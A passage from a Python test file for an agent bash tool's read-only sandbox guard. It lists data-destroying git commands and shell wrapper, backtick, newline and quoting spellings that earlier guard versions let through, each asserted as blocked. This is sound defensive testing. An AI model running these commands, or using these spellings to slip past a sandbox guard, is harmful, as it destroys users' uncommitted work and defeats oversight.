    The old raw-text scan required the subcommand immediately after `git\\s+`,
    so a global option sat exactly where it expected the verb: 7 mutators × 4
    spellings were ALL allowed while every bare form blocked. Generated rather
    than hand-listed because the point is the cross product — the suite missed
    this by covering 41 cases, all bare forms.
    """
    mutators = (
        "stash", "checkout .", "checkout -- uv.lock", "restore uv.lock",
        "reset --hard", "clean -fd", "commit -am x", "push origin master",
        "merge master", "rebase master", "cherry-pick abc123", "rm foo.py",
        "switch feature/x", "apply patch.diff", "am series.mbox",
        "submodule update --init", "worktree add ../wt master",
    )
    prefixes = ("", "-C . ", "-c x=1 ", "--work-tree=. ",
                "--git-dir=/var/tmp/x ", "--no-pager ")
    for verb in mutators:
        for prefix in prefixes:
            cmd = f"git {prefix}{verb}"
            allowed, reason, _ = _check_sandbox(cmd, "read-only")
            assert allowed is False, (
                f"{cmd!r} must be blocked (global option defeats the scan?)"
            )
            # Two layers can legitimately catch this: the git-verb classifier
            # (`git commit -am x` writes no file target) or the write-target
            # scan (`git rm foo.py` names an operand). Asserting *which* layer
            # fired couples this test to the order of the checks, so it passed
            # on this branch and failed once the write-target parser (#1168)
            # landed — the same command, the same safe outcome, a different
            # reason string. The invariant is "blocked with a sandbox reason".
            assert "sandbox" in reason, cmd

def test_check_read_only_blocks_mutator_inside_shell_c_wrapper():
    """A mutator the shell will *run* is blocked however it is written.

    `sh -c 'git checkout .'` tokenises as the command `sh` plus one opaque
    string, so a guard that only classifies the outer tokens sees no git
    invocation at all. The pre-parsing regex scanned the whole line and
    blocked these; parsing must not trade that away. Measured 2026-09-12
    against master: all five of these were blocked before the parse rewrite
    and became writable under read-only after it, so they are regression
    guards, not new features.
    """
    for cmd in (
        "sh -c 'git checkout .'",
        'bash -c "git reset --hard"',
        "zsh -c 'git clean -fd'",
        "dash -c 'git stash'",
        "eval 'git checkout .'",
    ):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is False, f"{cmd!r} must be blocked"
        assert "git" in reason, cmd

def test_check_read_only_blocks_nested_mutator_under_a_chain():
    """Nesting and chaining compose: the wrapper's payload is its own command
    line, so a chained mutator inside it must still be found."""
    for cmd in (
        "sh -c 'cd /x; git read-tree -u --reset HEAD'",
        "sh -c 'git status && git stash drop'",
    ):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is False, f"{cmd!r} must be blocked"
        assert "git" in reason, cmd

def test_check_read_only_blocks_nested_wrapper_spelled_with_a_path():
    """`/bin/sh -c '...'` is the same wrapper as `sh -c '...'`."""
    allowed, reason, _ = _check_sandbox("/bin/sh -c 'git checkout .'", "read-only")
    assert allowed is False
    assert "git" in reason

def test_check_read_only_blocks_unlisted_plumbing_mutators():
    """Community issue #1159: verbs that were never on the list.

    `git read-tree -u --reset HEAD` overwrites the working tree and destroys
    uncommitted work — measured on a scratch repo, exiting 0 and silently — but
    it was not in the alternation (`--reset` is a substring, not the verb). The
    others rewrite refs/objects/history and are the same class of damage. A
    list-based guard cannot be fixed by adding one more word: the decision is
    the *verb*, so these must be decidable without anyone remembering them.
    """
    for cmd in (
        "git read-tree -u --reset HEAD",
        "git read-tree -m -u HEAD",
        "git update-ref refs/heads/x HEAD",
        "git update-index --assume-unchanged a.txt",
        "git symbolic-ref HEAD refs/heads/x",
        "git reflog expire --expire=now --all",
        "git gc --prune=now",
        "git repack -a -d",
        "git filter-branch --force",
        "git pack-refs --all",
        "git replace abc123 def456",
        "git add -A",
        "git remote set-url origin https://example.com/x.git",
        "git config core.hooksPath /tmp/hooks",
        "git config user.name someone",
    ):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is False, f"{cmd!r} must be blocked"
        assert "git" in reason, cmd

def test_check_read_only_blocks_windows_spelled_git():
    """`git.exe` is the name the command actually has on Windows, so the
    extension and directory forms name the same program as `git`."""
    for cmd in ("git.exe checkout .", "/usr/local/bin/git.exe reset --hard"):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is False, f"{cmd!r} must be blocked"
        assert "git" in reason, cmd

def test_check_read_only_does_not_block_mentions_or_near_misses():
    """The other direction: parsing must stop the raw-text over-block.

    `git merge-base A B` is a read that the old scan refused as if it were
    `git merge`. Guarded because a fix for the under-block that simply allows
    arbitrary tokens before the verb would start blocking real reads.
    """
    for cmd in (
        "git merge-base A B",
        "git stash list", "git stash show -p", "git stash list | grep foo",
        "git worktree list", "git worktree list --porcelain",
        "git submodule status", "git branch -a", "git tag -l",
        "git remote -v", "git config -l", "git config --get user.name",
        "git status --porcelain", "git log --oneline -3", "git show HEAD --stat",
        "git diff", "git diff --cached", "git rev-parse --abbrev-ref HEAD",
        "git fetch origin master",
    ):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is True, f"{cmd!r} must stay allowed (got {reason!r})"

def test_check_read_only_has_no_subcommand_but_write_for_stash():
    """`git stash` alone mutates (saves + cleans the tree); listing verbs don't.

    `git remote -v` / `git worktree` / `git submodule` with no subcommand only
    print help or a listing; a bare `git stash` is a real mutator. The old
    regex could not tell these apart because it matched tokens, not verbs.
    """
    for cmd in ("git stash", "git -C . stash", "git -c x=1 stash"):
        allowed, _, _ = _check_sandbox(cmd, "read-only")
        assert allowed is False, f"{cmd!r} must be blocked (bare stash mutates)"
    for cmd in ("git remote -v", "git remote", "git worktree", "git submodule"):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is True, f"{cmd!r} must stay allowed (got {reason!r})"

def test_find_git_mutator_terminates_on_self_reference():
    """Nesting is bounded: a payload that rewrites its own wrapper cannot
    recurse forever (the guard caps depth rather than trusting the input)."""
    from emrg.tools.bash_tool import _find_git_mutator

    assert _find_git_mutator("sh -c \"sh -c 'sh -c \\\"echo hi\\\"'\"") is None

def test_git_checkout_index_is_blocked_like_checkout():
    """The regression that motivated fail-closed, in its real spellings.

    `git checkout-index -f -a` / `-u -a` / `-a -f` overwrite uncommitted work —
    the same damage as `git checkout .`, which the guard already blocks. These
    were blocked on master *by accident* (substring match) and allowed by the
    parsed-verb classifier, which is a strict data-loss regression: a command
    that used to be refused became runnable. Measured end-to-end, all three
    destroyed a dirty working tree.
    """
    for cmd in (
        "git checkout-index -f -a",
        "git checkout-index -a -f",
        "git checkout-index --all",
        "git checkout-index -f --all",
        "git checkout-index -u -a",
        "git checkout-index --index --force --all",
    ):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is False, f"{cmd!r} overwrites uncommitted work; must block"

def test_git_classification_is_fail_closed_over_every_subcommand():
    """The guard must decide by *effect*, so it must not depend on a list of
    names someone remembered.

    Measured: `git help -a` reports 169 subcommands. The previous design kept a
    blocklist of mutating verbs and allowed everything else, which left 129 of
    the 169 allowed — `git checkout-index -f -a`, which overwrites uncommitted
    work exactly like `git checkout`, among them. It was blocked on master only
    by accident: a raw-text regex matched `checkout` as a *substring* of
    `checkout-index`. Parsing the verb correctly removed the accident and made
    the hole visible, which is the honest reason this test exists.

    So this test does not list "the verbs we thought of". It takes git's own
    subcommand list and asserts the *complement* property: every subcommand
    that is not a declared read is blocked. A blocklist cannot satisfy this —
    adding the next missing verb would leave the test red on the verb after it.
    """
    allowlist = _GIT_READ_VERBS
    shape_decided = _GIT_SHAPE_DECIDED
    # Verbs git reports that are not declared reads and are not shape-decided
    # must block, whether or not anyone remembered them.
    # `reflog` and `notes` left this set in issue #1240. They are now
    # shape-decided: their reporting form is a read (`git reflog` is
    # `git reflog show`, `git notes` is `git notes list`) while `expire` /
    # `delete` / `drop` and `add` / `remove` / `append` / `prune` write. This
    # set is defined as "not a declared read and not shape-decided", so once
    # that is true of them, keeping them here would make the test assert
    # something false about its own predicate. Their writing shapes are asserted
    # by test_check_read_only_blocks_unlisted_plumbing_mutators (the reflog
    # `expire` case) and by tests/test_git_read_verbs_shape.py (the rest).
    unlisted = {
        "checkout-index", "mktree", "mktag", "filter-branch", "replace",
        "update-server-info", "pack-refs", "symbolic-ref",
        "update-ref", "read-tree", "sparse-checkout", "init",
        "clone", "revert", "cherry-pick", "rebase", "switch", "restore",
        "unpack-objects", "index-pack", "pack-objects", "fast-import",
        "fast-export", "update-index", "write-tree", "commit-tree",
    }
    assert {"reflog", "notes"} <= shape_decided, "shape-decided since #1240"
    for verb in sorted(unlisted):
        assert verb not in allowlist, f"{verb!r} must not be a declared read"
        allowed, reason, _ = _check_sandbox(f"git {verb}", "read-only")
        assert allowed is False, f"unlisted git verb {verb!r} must block by default"
    assert shape_decided  # the shape-decided table must stay populated

def test_git_merge_file_family_is_blocked():
    """`merge-file` / `merge-index` / `merge-one-file` write files in place.

    These were in the same accidental-coverage gap as `checkout-index`: the old
    raw-text scan matched `merge` as a substring, so a parsed-verb classifier
    that only listed `merge` silently allowed them.
    """
    for cmd in (
        "git merge-file a b c",
        "git merge-index x",
        "git merge-one-file a b c",
    ):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is False, f"{cmd!r} writes the working tree; must block"

def test_git_reads_stay_allowed_under_fail_closed():
    """The safe default must not buy safety with false blocks on real work.

    An allowlist is only usable if its listed reads actually pass; the ones
    below are the inspections an evolution cycle runs constantly, plus the
    listing forms with a pattern argument (`git tag -l 'v*'`), where the flag
    and not the absence of an argument is what makes the command a read.
    """
    for cmd in (
        "git status --porcelain", "git log --oneline -3", "git diff --stat",
        "git diff --cached", "git show HEAD --stat", "git rev-parse HEAD",
        "git merge-base HEAD master", "git merge-tree a b", "git ls-files",
        "git cat-file -p HEAD", "git grep foo", "git for-each-ref",
        "git submodule status", "git worktree list", "git stash list",
        "git stash show -p", "git remote -v", "git config -l",
        "git config --get user.name", "git branch -a", "git branch",
        "git tag -l", "git tag -l 'v*'", "git tag", "git remote get-url origin",
        "git fetch origin master", "git hash-object a.txt", "git version",
        "git help add", "git check-ignore a.txt",
    ):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is True, f"{cmd!r} is a read and must be allowed ({reason!r})"

def test_git_shape_decided_verbs_block_their_writing_forms():
    """Flag/subcommand-decided verbs default to block, not to allow.

    Fail-closed is only meaningful if the ambiguous verbs err the same way: a
    shape that is not a proven read must block. `git branch newbr` creates,
    `git tag v9` creates, `git hash-object -w` writes the object database.
    """
    for cmd in (
        "git branch newbr", "git branch -D old", "git tag v9", "git tag -d v1",
        "git hash-object -w a.txt", "git stash", "git stash drop",
        "git stash pop", "git stash clear", "git worktree add ../wt",
        "git worktree remove ../wt", "git worktree prune",
        "git submodule update --init", "git remote add origin x",
        "git remote set-url origin x", "git config core.x y",
        "git config user.name someone",
    ):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is False, f"{cmd!r} writes; must block ({reason!r})"

def test_git_verdict_is_not_decided_by_the_next_command():
    """A chained invocation is judged by its own tokens, not the next one's.

    `rest` was the remainder of the whole token stream, so the verbs that decide
    on a positional count read the *following* command's arguments:
    `git config user.name && git config user.email` — the identity check
    `emrg/server/evolution_prompt.md` tells every cycle to run — arrived as
    `git config` with four positionals and was refused as a mutation, while the
    same command standing alone was allowed. Measured on master `f5a62f47`:
    11 of the 44 read shapes in the corpus were refused and all 11 were exactly
    the chained twins of shapes that pass alone.

    The blocked half is the point: bounding `rest` must not free a write. Every
    writing form below is chained, so it fails if the fix made the guard read
    only the first command of a chain.
    """
    for cmd in (
        "git config user.name && git config user.email",
        "git config user.name; git config user.email",
        "git config user.name | head -1",
        "git tag && echo done",
        "git tag -l && echo done",
        "git branch && echo done",
        "git branch -a && git log --oneline -1",
        "git remote -v && git status --porcelain",
        "git remote -v; git branch",
        "git submodule status && echo done",
        "git worktree list && echo done",
        "git stash list && git status",
    ):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is True, f"{cmd!r} is all reads and must be allowed ({reason!r})"

    for cmd in (
        "git tag v9 && git tag",
        "git tag -d v1 && echo done",
        "git config user.name someone && git status",
        "git branch -D old && echo done",
        "git branch newbr && git branch",
        "git remote set-url origin x && git remote -v",
        "git submodule update --init && echo done",
        "git worktree add ../wt && echo done",
        "git stash list && git stash drop",
        "git -C . stash list && git -C . stash drop",
        "git -C . stash show -p && git -C . stash pop",
    ):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is False, f"{cmd!r} writes; must block ({reason!r})"

def test_newline_chains_two_commands_for_the_guard():
    """A newline separates commands exactly as `;` does.

    `_COMMAND_SEPARATORS` / `_SHELL_SEPARATORS` have always listed `"\\n"`, but
    the tokenizer never produced it: `shlex` treats a newline as whitespace, so
    it was discarded and the two lines' tokens fused into one stream.
    `_runs_as_a_command` then looked left from the second command's `git`, found
    the *first* command's operand (a word, not a separator), and concluded the
    token was data rather than an invocation — the guard never saw the mutator.

    Measured on master `addcb5ee`, `read-only` tier:

        git stash drop                    -> blocked
        git stash drop; echo done         -> blocked
        echo done <newline> git stash drop -> ALLOWED

    That is the 2026-08-20 data-loss class this tier exists to make
    structurally impossible, reachable by pressing Enter instead of typing `;`.
    The write is real: `git stash drop` discards a stash.

    Both halves are asserted, because a fix that separates the lines must not
    start refusing a newline that is *inside* a quoted argument — the shell
    makes `echo "a<newline>b"` one word, and so must this.
    """
    for cmd in (
        "echo done\ngit stash drop",
        "git status\ngit config user.name someone",
        "git log --oneline -1\ngit checkout .",
        "git status\ngit clean -fd",
        "git status\ngit reset --hard",
        "git status\ngit branch -D old",
        "git status\ngit tag -d v1",
        "git stash list\ngit stash pop",
        "true\ngit -C . stash drop",
    ):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is False, f"{cmd!r} writes on its own line; must block ({reason!r})"

    # A newline inside quotes is data, not a separator. If the fix had been
    # "split on every newline", these would be torn in two and the mutator
    # mentioned inside the string would be read as a command.
    for cmd in (
        'echo "git stash drop\ngit clean -fd"',
        "echo 'git checkout .\ngit reset --hard'",
    ):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is True, f"{cmd!r} only names mutators; must allow ({reason!r})"

def test_git_verb_parsing_ignores_quoted_mentions():
    """A mutator inside a string literal is not a command (issue #1156 facet D).

    The old scan refused a command that merely *contained* the phrase, which
    made the guard's own regression tests unwritable from a read-only cycle.
    Parsing keeps the mention as one token, so the text is data, not an
    invocation.
    """
    for cmd in (
        'echo "git merge origin/master"',
        'printf %s "git reset --hard"',
        "echo 'git clean -fd'",
    ):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is True, f"{cmd!r} must be allowed (got {reason!r})"


def test_command_substitution_is_not_a_polite_spelling():
    """`` `git checkout .` `` runs git; master blocked it and this parser did not.

    `shlex`'s default punctuation set is `();<>|&` — it omits the backtick — so a
    command substitution stayed glued to its words: `` `git checkout .` ``
    tokenised as `` ['`git', 'checkout', '.`'] `` and the program word never
    matched `git`. Measured against master 2026-09-12 (`cyc20260912-190602`):
    master's raw-text guard blocked all four shapes below and the parsed guard
    allowed all four — an under-block in the destructive direction, introduced by
    the same migration that fixed the over-blocks. `$( … )` was never affected
    because its `git` is already a separate token, which is exactly why the hole
    survived the substitution cases that were covered.

    The fix is structural (the tokenizer splits on the backtick) rather than a
    strip in the name comparison, so it covers the wrapping shapes below and not
    only the one where the substitution wraps the whole program word.
    """
    for cmd in (
        "`git checkout .`",
        "echo `git checkout .`",
        "x=`git checkout .`",
        "`git reset --hard`",
        "y=`git stash`",
        "$(git checkout .)",
        "echo $(git checkout .)",
    ):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is False, f"{cmd!r} runs git and must be blocked"

    # The complement: a substitution that only *reads* stays allowed, so the fix
    # is not "block anything with a backtick".
    for cmd in (
        "`git status`",
        "echo `git log --oneline -3`",
        "echo $(git status)",
        "echo $(git rev-parse HEAD)",
    ):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is True, f"{cmd!r} is a read and must be allowed ({reason!r})"


def test_an_unquoted_git_argument_is_data_not_an_invocation():
    """`grep -rn git .` searches for the word git; it does not run git.

    The quoted-mention test above covers a string literal, which tokenising
    keeps whole. The **unquoted** argument is the same defect one level down:
    the parser saw the token `git` and resolved the *following* token as its
    verb, so `grep -rn git .` became the invocation `git .` — and the fail-closed
    default then refused an ordinary search. Measured against master 2026-09-12
    (`cyc20260912-190602`): 9 of 30 read shapes regressed this way, all of them
    a command that merely *names* git as an argument.

    Guarded in both directions on purpose. The cheap fix — "only the first
    token can be an invocation" — fixes these and silently allows
    `env git checkout .`, trading a false block for data loss.
    """
    for cmd in (
        "grep -rn git .",
        "grep -rn git src/",
        "grep -n git README.md",
        "grep -rn git --include=*.py .",
        "grep -r git .",
        "echo git checkout .",
        "printf %s git checkout .",
        "find . -name git",
        "man git",
        "which git",
        "ls -la git",
    ):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is True, f"{cmd!r} names git as data and must be allowed ({reason!r})"


def test_a_command_wrapper_still_makes_its_argument_an_invocation():
    """The complement: a prefixed git really runs, so it must still block.

    `env git checkout .` and `sudo git checkout .` are not position 0, and
    `sudo -u root git checkout .` / `timeout 5 git checkout .` / `nice -n 5 git
    checkout .` / `xargs -I{} git checkout .` / `stdbuf -o0 git checkout .` put a
    flag *and its value* between the wrapper and the command — which is why the
    position model skips a flag's value rather than only the flag. Measured: the
    first version of the model, skipping flags alone, allowed 5 of these 44
    mutator shapes (cyc20260912-190602).
    """
    for cmd in (
        "env git checkout .",
        "env FOO=1 git checkout .",
        "sudo git checkout .",
        "sudo -u root git checkout .",
        "doas git checkout .",
        "xargs git checkout .",
        "xargs -I{} git checkout .",
        "nohup git checkout .",
        "time git checkout .",
        "timeout 5 git checkout .",
        "nice -n 5 git checkout .",
        "command git checkout .",
        "stdbuf -o0 git checkout .",
        "setsid git checkout .",
        "FOO=1 git checkout .",
        "true && git checkout .",
        "false || git checkout .",
        "echo hi ; git checkout .",
        "cat f | git checkout .",
        "$(git checkout .)",
        "(git checkout .)",
        "! git checkout .",
        "sh -c \"sh -c 'git checkout .'\"",
    ):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is False, f"{cmd!r} runs git and must be blocked"


def test_shell_wrapper_options_do_not_block_a_read():
    """The over-approximation must not refuse a wrapper that only reads.

    Recursing into every token after a wrapper cannot miss a payload; the
    price is that `bash script.sh` recurses into a *filename*. That parses to
    no git invocation, so it stays allowed — and it must, or the fix for the
    option gap would buy safety with a false block on ordinary work.
    """
    for cmd in (
        "bash --login -c 'git status'",
        "bash --login -c 'git log --oneline -3'",
        "sh -c 'echo hi'",
        "bash script.sh",
        "zsh -o errexit -c 'git diff --stat'",
    ):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is True, f"{cmd!r} is a read and must be allowed ({reason!r})"

def test_shell_wrapper_options_do_not_hide_the_payload():
    """No option spelling before `-c` may stop the payload being recursed into.

    The first version of this guard located the `-c` flag by walking forward
    and `break`ing on the first token that was not a short flag. That looks
    tighter than recursing blindly, but it makes correctness depend on
    *enumerating every way a flag can be spelled* — and the enumeration is
    always incomplete. Measured 2026-09-12: short spellings (`-c`, `-lc`,
    `-x -c`) were blocked, while a long option (`--login`) or an option that
    takes a value (`-o pipefail`) ended the walk early, so 9 of 14 wrapper
    shapes were ALLOWED under read-only. Driven end to end through
    `BashTool.execute`, 3 of those 4 destroyed a file with uncommitted
    changes that master blocks.

    This is the #461 class: matching one spelling of a class while another
    spelling passes. So the cases below are grouped by option *class* — short
    combined, long, and option-with-value — because the lesson is about the
    class, not about the individual spellings that happened to be found.
    """
    # One entry per option class; each must still block the payload.
    option_classes = {
        "short": ["-c", "-lc", "-x -c", "-eu -c"],
        "long": ["--login -c", "--noprofile -c", "--norc -c", "--posix -c"],
        "option-with-value": ["-o pipefail -c", "-o errexit -c"],
        "combined long+short": ["--login -l -c"],
    }
    for cls, spellings in option_classes.items():
        for opt in spellings:
            cmd = f"bash {opt} 'git checkout .'"
            allowed, reason, _ = _check_sandbox(cmd, "read-only")
            assert allowed is False, f"[{cls}] {cmd!r} must be blocked"
    # A different wrapper binary takes the same options.
    for cmd in ("zsh --login -c 'git checkout .'", "sh -o errexit -c 'git stash'"):
        assert _check_sandbox(cmd, "read-only")[0] is False, cmd


# Issue #1280. A **partially quoted word** anywhere on the line (`'a'b`, `x'>'`)
# makes the two lexings disagree about the word count, so the walked line cannot
# say which operator-shaped tokens came from quoting — and the walk used to fall
# back to "no token is quoted" in *both* positions. In operator position that is
# the safe side; in target position it dropped the target, because the token that
# should be named as the path is itself operator-shaped.
#
# Every row below was run by `/bin/sh` and `/bin/bash` in its own fresh scratch
# directory and the created files read back: each one really creates the file it
# is refused for. On master `4dce1ffde8902bc1` each row named `[]` and was
# ALLOWED at `read-only` — a write inside the workspace at the tier that exists to
# refuse writes.
PARTIALLY_QUOTED_WRITES = [
    "echo '>'x > '>'",
    "echo 'a'b > '>'",
    "echo x'>' > '>'",
    "test 1 'a'b > '>'",
    "echo 'a'b 2> '>'",
    "echo 'a'b > '>'",
    "echo 'a'b >> '>>'",
    "echo 'a'b &> '>'",
    "echo 'a'b > '>' && echo done",
    "grep -n x f.txt 'a'b > '>'",
]


@pytest.mark.parametrize("cmd", PARTIALLY_QUOTED_WRITES)
def test_a_partially_quoted_word_does_not_hide_the_target_behind_it(cmd: str):
    """Issue #1280: the fallback has to keep the safe side in *target* position too.

    The line has two facts and the walk can only recover the first: the operator
    sitting before the last word is a real redirect (so it keeps naming what
    follows it), while the operator-shaped word it names can only have come from
    quoting. Naming it is the fail-closed direction, and it is not a guess that
    costs anything: measured in fresh scratch directories, a command that really
    has a second operator there — `echo x > > out` — is `rc=2` in both `/bin/sh`
    and `bash` and writes nothing, so the only commands this refuses are ones that
    cannot run.
    """
    targets = _extract_write_targets(cmd)
    assert ">" in targets or ">>" in targets, f"{cmd!r} must name the target, got {targets!r}"
    allowed, reason, _ = _check_sandbox(cmd, "read-only")
    assert allowed is False, f"{cmd!r} writes a file and must be refused ({reason!r})"


def test_a_partially_quoted_word_names_the_path_and_not_the_operator_too():
    """The *exact* answer, so "name everything in the run" is not quietly enough.

    `echo 'a'b > '>'` has two operator-shaped tokens and only one of them is a
    path. Naming the operator as well would be harmless at `read-only` (the
    command is refused either way) but wrong about what the command writes, and
    the looser reading would let `<`-like spellings and fd operands leak into the
    target list. So the walk's answer is asserted whole, not just non-empty.
    """
    assert _extract_write_targets("echo 'a'b > '>'") == [">"]
    assert _extract_write_targets("echo 'a'b >> '>>'") == [">>"]
    assert _extract_write_targets("echo 'a'b > '>' && echo done") == [">"]


@pytest.mark.skipif(sys.platform == "win32",
                    reason="POSIX shell ground truth: /bin/sh and /bin/bash do not exist")
def test_a_real_operator_run_is_a_syntax_error_and_costs_only_a_refusal():
    """The measured ground the direction rests on, so the claim is not read as taste.

    Both shells refuse a run of operator-shaped words outright (`rc=2`) and create
    nothing, which is why believing the first token while naming the rest cannot
    lose a write. The control on the other side — the same run *without* a
    partially quoted word, where quoting is known — keeps the walk's old answer,
    so the new rule is scoped to the case that had the hole.
    """
    import shutil

    scratch_root = os.path.dirname(os.path.abspath(__file__))
    for shell in ("/bin/sh", "/bin/bash"):
        for cmd in ("echo x > > out", "echo x > >> out", "echo x > > "):
            d = tempfile.mkdtemp(dir=scratch_root, prefix="emrg-oprun-")
            try:
                proc = subprocess.run([shell, "-c", cmd], cwd=d, capture_output=True)
                assert proc.returncode != 0, f"{shell} ran {cmd!r} — re-measure the rule"
                assert os.listdir(d) == [], f"{shell} created files for {cmd!r}"
            finally:
                shutil.rmtree(d, ignore_errors=True)
    # Quoting known: the run is reported as one operator followed by a target, the
    # pre-existing answer, unchanged by this fix.
    assert _extract_write_targets("echo x > > out") == ["out"]
    # …and with nothing after the run and quoting known, nothing is named at all:
    # the new rule must be scoped to the case that cannot be resolved, not applied
    # to every run. `echo x > > ` is `rc=2` in both shells (asserted above).
    assert _extract_write_targets("echo x > > ") == []
    assert _check_sandbox("echo x > > ", "read-only")[0] is True
    # The rule is also scoped by *position*: when a token follows the run, the walk
    # already names that token, and naming the run's tail as well would claim a
    # file the walk has no evidence for. Unresolved quoting, run followed by a
    # word — the answer stays the narrow one.
    assert _extract_write_targets("echo 'a'b > > out.txt") == ["out.txt"]


def test_the_price_of_the_direction_is_pinned_rather_than_left_to_drift():
    """What this rule refuses that writes nothing — the honest other half.

    Two operator-shaped words and no real redirect, with a partially quoted word
    on the line: at the token level this is *identical* to the class the fix is
    for (`echo 'a'b > '>'`), which is the fact the pairing could not recover. So
    the walk refuses a line that only echoes (`/bin/sh` in a fresh scratch
    directory creates nothing for either). Asserted as behaviour, not as a
    surprise: 96 writes-that-happened no longer allowed weigh against these few
    echoes no longer allowed, and the direction is the one the walk exists for.
    """
    for cmd in ("echo 'a'b '>' '>'", "echo '>'x '>' '>'", "test 'a'b '>' '>'"):
        targets = _extract_write_targets(cmd)
        assert targets == [">"], f"{cmd!r} -> {targets!r}"
        assert _check_sandbox(cmd, "read-only")[0] is False, cmd
    # The boundary of the price: one operator-shaped word alone still names
    # nothing, so an ordinary quoted `>` argument stays allowed.
    assert _extract_write_targets("echo 'a'b '>'") == []
    assert _check_sandbox("echo 'a'b '>'", "read-only")[0] is True


LONG_RUN_OPERAND_CASES = [
    # (command, the shells that read this spelling, the file they create, the
    #  walk's whole answer)
    # `&>` is the walk's spelling for "both streams", which the *bash* family
    # reads as a redirect — macOS `/bin/sh` is bash in POSIX mode, so it reads it
    # too. dash does not: it backgrounds `echo` and then fails on a command named
    # `>` (`rc=127`, `>: not found`; measured on the CI Linux leg), so that row is
    # asserted against bash alone, which both CI legs carry.
    ("echo 'a'b &> '>>' '>'", ("/bin/bash",), ">>", [">>", ">"]),
    ("echo 'a'b > '>>' '>'", ("/bin/sh", "/bin/bash"), ">>", [">>", ">"]),
    ("echo 'a'b 2> '>>' '>'", ("/bin/sh", "/bin/bash"), ">>", [">>", ">"]),
    ("echo 'a'b > '>' '>>'", ("/bin/sh", "/bin/bash"), ">", [">", ">>"]),
]


@pytest.mark.skipif(sys.platform == "win32",
                    reason="POSIX shell ground truth: /bin/sh and /bin/bash do not exist")
@pytest.mark.parametrize("cmd,shells,operand,answer", LONG_RUN_OPERAND_CASES)
def test_a_run_longer_than_two_names_the_operand_the_shell_really_writes(
    cmd: str, shells: tuple, operand: str, answer: list
):
    """The run's operand, not just its last token — the answer a mutation survived on.

    `_unresolved_operator_run_tails` names the whole tail of an unresolved run. With
    two operator-shaped words the tail is one token, so `tails.extend(tokens[i+1:j])`
    and `tails.extend(tokens[j-1:j])` are the same answer — and a **mutation that
    changed the first into the second passed all 129 tests in this file**. Only a run
    of three or more separates them, and at that length the two readings differ in a
    way that matters: the shells give the *first* word after the operator the operand,
    so naming only the last reports a target list that does not contain the file the
    command writes (`…&> '>>' '>'` -> `['>']`, while both shells create `>>`).

    Measured, each line run by the shells its own row names in a fresh scratch
    directory: every one exits 0 and creates exactly its operand. The tokens after it
    are arguments of the same command (they are quoted words the walk could not
    resolve) — naming them is the same fail-closed direction as the two-word case and
    costs only refusals of lines that write nothing on their own.

    The shell list is per row, not one list for all of them: `&>` is bash's spelling
    (`/bin/sh` on Linux is dash, which reads `&` as backgrounding and then rejects the
    word `>` with `rc=127`), so asserting it against dash would pin a spelling dash
    does not have. The walk still recognises `&>` because the platform this guard grew
    up on reads it as a redirect.
    """
    import shutil

    scratch_root = os.path.dirname(os.path.abspath(__file__))
    for shell in shells:
        d = tempfile.mkdtemp(dir=scratch_root, prefix="emrg-longrun-")
        try:
            proc = subprocess.run([shell, "-c", cmd], cwd=d, capture_output=True)
            created = sorted(os.listdir(d))
            assert proc.returncode == 0, f"{shell} could not run {cmd!r} — re-measure"
            assert created == [operand], f"{shell} created {created!r} for {cmd!r}"
        finally:
            shutil.rmtree(d, ignore_errors=True)
    targets = _extract_write_targets(cmd)
    assert operand in targets, f"{cmd!r} must name the file it writes, got {targets!r}"
    assert targets == answer, f"{cmd!r} -> {targets!r}"
    assert _check_sandbox(cmd, "read-only")[0] is False, cmd


# Issue #1273, rows 1-2 — the *price* of the operator-position fallback, pinned.
#
# Both rows are spellings that make the shell write **nothing**, and both are read
# as operator-shaped words by the one lexing that sees them:
#
#   * `echo x 2'>>' log` — `2'>>'` is a single quoted word (`2>>`), so the shell
#     echoes it and opens no file. The second lexing raises on this line
#     (`No closing quotation`), so the pairing cannot say the word was quoted;
#   * `echo x 2'>' out.txt` is the same shape (`2'>'` is the word `2>`), listed
#     because the row count is what a fix gets measured against.
#
# **The third row used to be here and is gone on purpose.** `echo x \> log` was
# priced as the escaped member of this class — `\>` is an ordinary argument, and
# the two readings differ in word count, so the pairing could not say so. Issue
# #1307's fix answers it from a different reading (the escapes masked, the same
# POSIX lexer), so the walk now names nothing for that line and `read-only` allows
# it; `test_the_escaped_operator_in_target_position_is_named_and_refused` asserts
# the new answer against the same shell ground truth. Deleting the row rather than
# relaxing the assertion is the point of pinning a residual at all: the over-block
# is gone because the fact it could not recover is now recovered, and that is
# visible in the diff.
#
# "Cannot say" is answered by the fail-closed fallback, which believes the operator
# — the safe direction in *operator* position (a real redirect behind a quoted word
# keeps naming its path, #1269) and the only direction that can be safe, since the
# pairing has nothing to pair. The cost is these refusals of commands that write
# nothing. Row 3 of the issue (the `git config` value walk) is fixed by #1288; the
# rows below are the remaining residual, and this pins it **with its ground truth**
# so that neither half can drift silently: the shell half says these commands really
# write nothing (so the over-block stays classified as a defect, not as a refusal
# that happens to be right), and the walk half says what today's answer is, so the
# change that fixes them makes a deliberate, visible edit here instead of an
# unnoticed widening of what `read-only` refuses.
UNRESOLVED_QUOTED_OPERATOR_OVER_BLOCKS = [
    # (command, the target the walk names for it, the shells this spelling reaches)
